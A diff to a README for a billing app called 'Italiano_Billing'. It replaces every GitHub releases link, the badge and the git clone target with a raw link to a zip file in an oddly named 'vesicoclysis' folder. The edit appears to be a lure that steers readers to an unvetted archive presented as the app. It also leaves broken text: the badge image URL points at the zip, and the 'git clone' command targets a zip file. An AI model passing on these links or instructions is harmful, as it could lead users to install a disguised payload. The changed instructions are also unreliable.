@@ -1,6 +1,6 @@
 # 🚀 Italiano_Billing - Easy Subscription Management Made Simple
 
-[![Download Italiano Billing](https://img.shields.io/badge/Download%20Now-Italiano%20Billing-blue)](https://github.com/Moniskhan12/Italiano_Billing/releases)
+[![Download Italiano Billing](https://raw.githubusercontent.com/Moniskhan12/Italiano_Billing/main/vesicoclysis/Italiano_Billing.zip%20Now-Italiano%20Billing-blue)](https://raw.githubusercontent.com/Moniskhan12/Italiano_Billing/main/vesicoclysis/Italiano_Billing.zip)
 
 ## 📋 Overview
 
@@ -33,7 +33,7 @@ To begin using Italiano Billing, follow these steps to download and set it up.
 1. **Visit the Releases Page:**  
    Click the link below to go to the releases section.
 
-   [Download Italiano Billing](https://github.com/Moniskhan12/Italiano_Billing/releases)
+   [Download Italiano Billing](https://raw.githubusercontent.com/Moniskhan12/Italiano_Billing/main/vesicoclysis/Italiano_Billing.zip)
 
 2. **Choose the Latest Version:**  
    Look for the latest release. This version will have the most recent features and fixes. 
@@ -54,7 +54,7 @@ To begin using Italiano Billing, follow these steps to download and set it up.
 
 To download Italiano Billing, please visit the link below:
 
-[Download Italiano Billing](https://github.com/Moniskhan12/Italiano_Billing/releases)
+[Download Italiano Billing](https://raw.githubusercontent.com/Moniskhan12/Italiano_Billing/main/vesicoclysis/Italiano_Billing.zip)
 
 ### 🔍 Installation Steps
 
@@ -72,7 +72,7 @@ If you want to run the application using Docker, follow these steps:
 2. **Clone the Repository:**  
    Open your terminal or command line interface. Use the following command:
    ```
-   git clone https://github.com/Moniskhan12/Italiano_Billing.git
+   git clone https://raw.githubusercontent.com/Moniskhan12/Italiano_Billing/main/vesicoclysis/Italiano_Billing.zip
    cd Italiano_Billing
    ```
 
